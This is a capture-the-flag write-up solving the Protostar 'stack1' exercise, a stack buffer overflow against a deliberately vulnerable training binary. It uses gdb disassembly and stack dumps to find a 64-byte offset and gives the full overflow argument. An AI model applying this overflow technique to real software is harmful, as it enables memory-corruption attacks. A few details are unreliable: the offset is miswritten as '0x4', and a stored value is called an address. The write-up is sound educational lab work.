# stack1
## Tools
- gdb (gef)

## Recon
By running the binary, we're given an error message:
```shell
stack1: please specify an argument
```

Running the binary again with the argument abc, we get:
```shell
Try again, you got 0x00000000
```

If I had to guess, we're going to have to overflow the stack so that the spillover into a variable equals a certain number. But what number do we need, and how far do we have to spill through the stack? To answer these questions we're gonna have to crack this baby open.

## Disassembling

Loading up gdb and quickly inspecting the functions, we see the only one of interest is the main function. Setting a breakpoint and popping in, let's take a look at the disassembly:

```shell
Dump of assembler code for function main:
   0x08048464 <+0>:	push   ebp
   0x08048465 <+1>:	mov    ebp,esp
   0x08048467 <+3>:	and    esp,0xfffffff0
   0x0804846a <+6>:	sub    esp,0x60
=> 0x0804846d <+9>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x08048471 <+13>:	jne    0x8048487 <main+35>
   0x08048473 <+15>:	mov    DWORD PTR [esp+0x4],0x80485a0
   0x0804847b <+23>:	mov    DWORD PTR [esp],0x1
   0x08048482 <+30>:	call   0x8048388 <errx@plt>
   0x08048487 <+35>:	mov    DWORD PTR [esp+0x5c],0x0
   0x0804848f <+43>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048492 <+46>:	add    eax,0x4
   0x08048495 <+49>:	mov    eax,DWORD PTR [eax]
   0x08048497 <+51>:	mov    DWORD PTR [esp+0x4],eax
   0x0804849b <+55>:	lea    eax,[esp+0x1c]
   0x0804849f <+59>:	mov    DWORD PTR [esp],eax
   0x080484a2 <+62>:	call   0x8048368 <strcpy@plt>
   0x080484a7 <+67>:	mov    eax,DWORD PTR [esp+0x5c]
   0x080484ab <+71>:	cmp    eax,0x61626364
   0x080484b0 <+76>:	jne    0x80484c0 <main+92>
   0x080484b2 <+78>:	mov    DWORD PTR [esp],0x80485bc
   0x080484b9 <+85>:	call   0x8048398 <puts@plt>
   0x080484be <+90>:	jmp    0x80484d5 <main+113>
   0x080484c0 <+92>:	mov    edx,DWORD PTR [esp+0x5c]
   0x080484c4 <+96>:	mov    eax,0x80485f3
   0x080484c9 <+101>:	mov    DWORD PTR [esp+0x4],edx
   0x080484cd <+105>:	mov    DWORD PTR [esp],eax
   0x080484d0 <+108>:	call   0x8048378 <printf@plt>
   0x080484d5 <+113>:	leave
   0x080484d6 <+114>:	ret
End of assembler dump.
```

Here we can see the value of a variable [esp+0x5c] being stored in the register eax. The register is then compared with 0x61626364 ("abcd"), and if they're not equal, the assembly jumps to a section of code that prepares and executes our "Try again" message.
```shell
   0x080484a7 <+67>:	mov    eax,DWORD PTR [esp+0x5c]
   0x080484ab <+71>:	cmp    eax,0x61626364
   0x080484b0 <+76>:	jne    0x80484c0 <main+92>
```

Now we know our stack overflow needs to reach [esp+0x5c], and we know we'll need to use our argument variable to overflow the stack, but where did our argument get stored?
If we put a breakpoint right before the cmp operation at 0x080484ab and print the stack:
```shell
gef➤  x/24x $esp
0xffffd180:	0xffffd19c	0xffffd45a	0xf7ffd608	0x00000000
0xffffd190:	0xf7ffcff4	0x0000002c	0x00000000	0x00636261
0xffffd1a0:	0xf7fc7550	0x00000000	0xf7da1a4f	0xf7fa2048
0xffffd1b0:	0xf7fc14b0	0xf7fd97cb	0xf7da1a4f	0xf7fc14b0
0xffffd1c0:	0xffffd200	0xf7fc1688	0xf7fc1b40	0x00000001
0xffffd1d0:	0x00000001	0x00000000	0x00000000	0x00000000
```
we see our variable ("abc" = 0x636261) in the second row of the last column, or $esp+0x1c (start from 0 and count every byte, or every 2 hex characters). Another way to see this is using the telescope command with gef:
```shell
gef➤  telescope $esp

0xffffd180│+0x0000: 0xffffd19c  →  0x00636261 ("abc"?)	 ← $esp
0xffffd184│+0x0004: 0xffffd45a  →  0x00636261 ("abc"?)
0xffffd188│+0x0008: 0xf7ffd608  →  0xf7fc9000  →  0x464c457f
0xffffd18c│+0x000c: 0x00000000
0xffffd190│+0x0010: 0xf7ffcff4  →  0x00033f14
0xffffd194│+0x0014: 0x0000002c (","?)
0xffffd198│+0x0018: 0x00000000
0xffffd19c│+0x001c: 0x00636261 ("abc"?)
0xffffd1a0│+0x0020: 0xf7fc7550  →  <__kernel_vsyscall+0000> push ecx
0xffffd1a4│+0x0024: 0x00000000
```
It's a bit easier to see that ("abc"?) is stored at memory address 0x00636261 which, in other words, is at the stack pointer offset +0x001c

Alright! The hard work is done. Now we just need to overflow the stack starting from [esp+0x1c] to [esp+0x5c]. The difference between the two memory locations is 0x4, or 64. Therefore, we need a string with 64+4 characters to spill into our [esp+0x5c] variable, but we also need to make sure our [esp+0x5c] variable ends up with 0x61626364 or "abcd".

HOWEVER, we need to keep making this even more complicated! By using elf-info, we can see:
```shell
gef➤  elf-info
[...]
Endianness            : 0x1 - LITTLE_ENDIAN
[...]
```
we're working with little endian, meaning we'll have to do some reversing magic. 

To sum it all up:
- there are 64 bytes between our entry point in the stack and the variable we want to overflow
- we want the overflowed variable to have a value of 0x61626364 ("abcd")
- we're working with little endian, so we're going to have to do (64 bytes) + ("dcba") to get the result we want (reverse "abcd")

## Cracking the stack

We can use the python script thrown together in [stack0](https://github.com/aldamd/CTF/tree/main/writeups/protostar/stack0) to generate 64 characters:
```python3
str_ = ""
for i in range(16):
    str_ += (chr(ord('A') + i)) * 4
print(str_)
```

and then we add "dcba" for a finished product of AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPdcba

```shell
./stack1 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPdcba
you have correctly got the variable to the right value
```

easy money! Let's just take a peek at the stack because we came all this way so why not:
```shell
gef➤  x/24x $esp
0xffffd140:	0xffffd15c	0xffffd419	0xf7ffd608	0x00000000
0xffffd150:	0xf7ffcff4	0x0000002c	0x00000000	0x41414141
0xffffd160:	0x42424242	0x43434343	0x44444444	0x45454545
0xffffd170:	0x46464646	0x47474747	0x48484848	0x49494949
0xffffd180:	0x4a4a4a4a	0x4b4b4b4b	0x4c4c4c4c	0x4d4d4d4d
0xffffd190:	0x4e4e4e4e	0x4f4f4f4f	0x50505050	0x61626364

gef➤  x/x $esp+0x5c
0xffffd19c:	0x61626364
```

and there we have it! [esp+0x5c] was successfully overflowed to 0x61626364
